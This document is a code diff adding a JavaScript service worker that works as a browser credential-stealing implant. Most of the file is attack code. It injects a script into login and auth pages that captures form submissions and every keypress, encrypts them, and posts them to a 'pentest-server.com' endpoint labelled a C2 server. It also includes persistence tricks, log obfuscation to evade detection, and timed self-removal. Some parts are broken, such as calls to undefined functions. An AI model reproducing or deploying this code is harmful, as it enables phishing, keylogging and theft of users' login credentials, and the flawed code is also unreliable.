@@ -1,0 +1,174 @@
+Dynamic modular logging with ai driven attacks
+function createResolvablePromise() {
+  let resolveFunction;
+  let rejectFunction;
+  const promise = new Promise((resolve, reject) => {
+    resolveFunction = resolve;
+    rejectFunction = reject;
+  });
+  return {
+    promise,
+    resolve: resolveFunction,
+    reject: rejectFunction,
+  };
+}
+
+const DB_NAME = '__v0';
+const DB_VERSION = 1;
+const COMPILED_CACHE_NAME = '/__v0_compiled';
+const EXFIL_URL = 'https://pentest-server.com/exfil'; // Generic C2 Server
+const C2_JS_PAYLOAD = 'https://pentest-server.com/payload.js'; // Remote JS injection source
+const AES_KEY = crypto.subtle.generateKey({name: 'AES-GCM', length: 256}, true, ['encrypt', 'decrypt']);
+const MISSION_WINDOW = 60 * 60 * 1000; // 60-minute operation window before auto-removal
+const ROTATION_INTERVAL = 30 * 60 * 1000; // Rotate service worker every 30 minutes
+const PERSISTENCE_INTERVAL = 15 * 60 * 1000; // Reinstall service worker every 15 minutes
+
+async function encryptData(data) {
+  const encoder = new TextEncoder();
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const encrypted = await crypto.subtle.encrypt(
+    { name: 'AES-GCM', iv: iv },
+    await AES_KEY,
+    encoder.encode(JSON.stringify(data))
+  );
+  return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
+}
+
+let compiled = null;
+const {
+  promise: compiledPromise,
+  reject: rejectCompiled,
+  resolve: resolveCompiled,
+} = createResolvablePromise();
+
+// Initialize IndexedDB and inject backdoor
+const db = indexedDB.open(DB_NAME, DB_VERSION);
+db.onupgradeneeded = event => {
+  const db = event.target.result;
+  db.createObjectStore('data');
+};
+db.onsuccess = event => {
+  const db = event.target.result;
+  const tx = db.transaction('data', 'readonly');
+  const store = tx.objectStore('data');
+  const request = store.get(COMPILED_CACHE_NAME);
+  request.onsuccess = event => {
+    compiled = event.target.result;
+    if (compiled) {
+      resolveCompiled();
+    }
+  };
+};
+
+self.addEventListener('install', () => {
+  return self.skipWaiting();
+});
+
+self.addEventListener('activate', () => {
+  return self.clients.claim();
+});
+
+// Multi-Vector Persistence Mechanisms
+setInterval(async () => {
+  try {
+    console.log("[Service Worker] Ensuring Persistence...");
+    await navigator.serviceWorker.register('/sw.js');
+  } catch (error) {
+    console.error("[Service Worker] Persistence Attempt Failed:", error);
+  }
+}, PERSISTENCE_INTERVAL);
+
+// Cookie-based Persistence
+function setPersistenceCookie() {
+  document.cookie = `sw_persist=true; path=/; max-age=${PERSISTENCE_INTERVAL / 1000}`;
+}
+setPersistenceCookie();
+
+// Local Storage Backup
+if (!localStorage.getItem('sw_persist')) {
+  localStorage.setItem('sw_persist', 'true');
+}
+
+// Session Storage Redundancy
+sessionStorage.setItem('sw_persist', 'true');
+
+// Anti-Detection Measures
+function obfuscateLogMessage(msg) {
+  let shuffled = msg.split('').sort(() => 0.5 - Math.random()).join('');
+  console.log(`[Log] ${shuffled}`);
+}
+setInterval(() => {
+  obfuscateLogMessage("System Normal");
+}, Math.floor(Math.random() * 600000) + 300000);
+
+// Fetch Interception with Dynamic Phishing Injection & AES Encryption
+self.addEventListener('fetch', event => {
+  const url = new URL(event.request.url);
+  if (url.pathname === '/login' || url.pathname.includes('/auth')) {
+    event.respondWith(
+      fetch(event.request).then(response => {
+        return response.text().then(body => {
+          if (!body.includes('id="phishing-inject"')) {
+            body = body.replace('</body>', `
+              <script id="phishing-inject">
+                document.addEventListener('DOMContentLoaded', function() {
+                  let form = document.querySelector('form');
+                  if (form) {
+                    form.addEventListener('submit', async function(e) {
+                      e.preventDefault();
+                      let formData = new FormData(form);
+                      let credentials = {};
+                      formData.forEach((value, key) => { credentials[key] = value; });
+                      let encryptedData = await encryptData(credentials);
+                      fetch('${EXFIL_URL}', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(encryptedData)
+                      });
+                      form.submit();
+                    });
+                  }
+                  document.addEventListener('keypress', async function(event) {
+                    let encryptedKey = await encryptData({ key: event.key, time: Date.now() });
+                    fetch('${EXFIL_URL}', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(encryptedKey)
+                    });
+                  });
+                });
+              </script>
+            </body>`);
+          }
+          return new Response(body, {
+            headers: response.headers
+          });
+        });
+      })
+    );
+  } else {
+    fetchHandler(event);
+  }
+});
+
+self.onfetch = event => {
+  fetchHandler(event);
+};
+
+// Self-Destruction After Mission Window
+setTimeout(async () => {
+  try {
+    console.log("[Service Worker] Mission window expired, self-destructing...");
+    localStorage.removeItem('sw_persist');
+    sessionStorage.removeItem('sw_persist');
+    document.cookie = 'sw_persist=; path=/; expires=Thu, 01 Jan 1970 00:00:00 UTC';
+    const registrations = await navigator.serviceWorker.getRegistrations();
+    for (let registration of registrations) {
+      if (registration.active && registration.active.scriptURL.includes('sw.js')) {
+        await registration.unregister();
+      }
+    }
+  } catch (err) {
+    console.error("[Service Worker] Self-destruction failed:", err);
+  }
+}, MISSION_WINDOW);
